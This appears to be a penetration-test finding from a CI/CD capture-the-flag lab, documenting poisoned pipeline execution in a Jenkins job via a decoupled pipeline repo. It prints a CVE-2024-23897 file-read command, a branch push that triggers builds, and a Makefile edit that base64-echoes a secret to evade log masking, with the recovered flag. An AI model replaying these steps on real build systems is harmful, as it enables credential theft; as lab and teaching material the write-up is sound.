# F-018: Decoupled Pipeline Repo + Branch Exclusion Filter Bypass (Mad Hatter / flag3)

**SEVERITY: HIGH**

| Field | Detail |
|---|---|
| Affected Asset | Jenkins job `wonderland-mad-hatter` + Gitea repos `Wonderland/mad-hatter` and `Wonderland/mad-hatter-pipeline` |
| OWASP CI/CD Mapping | **CICD-SEC-4** (Poisoned Pipeline Execution) — attacker-controlled branch triggers a remotely-sourced Jenkinsfile · CICD-SEC-6 (Insufficient Credential Hygiene) — flag exposed via Makefile modification |
| Status | CONFIRMED, CTFd-verified (flag3) |

## Discovery

Mad Hatter's Jenkins job was initially written off as a dead end — Gitea's public `/explore/repos` showed its only branch (`main`) contained no Jenkinsfile, and Jenkins' own branch indexing only discovered `main` anyway. The actual vulnerability was revealed by reading the job's `config.xml` directly via [CVE-2024-23897](./F-016-CVE-2024-23897-jenkins-cli-arbitrary-file-read.md):

```bash
java -jar jenkins-cli.jar -s http://localhost:8080/ -auth alice:alice \
  connect-node "@/var/jenkins_home/jobs/wonderland-mad-hatter/config.xml"
```

Key fields in the config explained the mystery entirely:

1. The `main` branch was explicitly excluded from discovery via an `<excludes>main</excludes>` filter — explaining why no builds ever ran.
2. The pipeline definition itself was pulled from a **completely separate repository** (`Wonderland/mad-hatter-pipeline`, via Jenkins' Remote Jenkinsfile Provider plugin) using a dedicated credential (`jenkins3`/`jenkins_hatter`) with no direct Gitea visibility.

The actual code being tested (`Wonderland/mad-hatter`) and the pipeline definition were **decoupled** — a real production pattern intended to prevent code contributors from modifying their own build pipeline.

## Exploitation

Since `main` was excluded, creating any non-`main` branch in `Wonderland/mad-hatter` (where `thealice` had confirmed `push:true`) was sufficient to trigger branch discovery and build execution. Jenkins automatically used the `jenkins3` credential to pull the Jenkinsfile from the pipeline repo, without us needing access to that credential ourselves.

```bash
cd poc_madhatter
git checkout -b vapt-poc-branch
echo "# VAPT test" >> VAPT_TEST.md
git add VAPT_TEST.md && git push origin vapt-poc-branch
```

The pipeline's `make` stage executed a Makefile from the code repo — which we fully controlled via our push access. The original Makefile called an internal API (`wonderland:1234`) using `$FLAG` as a bearer token; we simply replaced that with a direct base64-encoded echo to bypass masking and get the credential value directly:

```makefile
whoami:
	echo $FLAG | base64
```

```bash
git add Makefile && git push origin vapt-poc-branch
# Console output: QUNENkU2QjgtMzU4NC00RjQzLUFCOUMtQUNEMDgwQjhFQkIyCg==
# Decoded: ACD6E6B8-3584-4F43-AB9C-ACD080B8EBB2
```

```
POST /api/v1/challenges/attempt {"challenge_id":3,"submission":"ACD6E6B8-3584-4F43-AB9C-ACD080B8EBB2"}
-> {"status":"correct"}
```

## Interview Talking Point

"Decoupled pipeline repo" patterns (separating the Jenkinsfile from the code repo) are a real, recommended security practice — but they **only protect against contributors modifying their own pipeline**. They don't protect against an attacker who has push access to the code repo and can modify any file the pipeline reads or executes, such as a Makefile, shell script, or test fixture. The protection boundary needs to be understood precisely, not assumed to cover all attack surfaces.
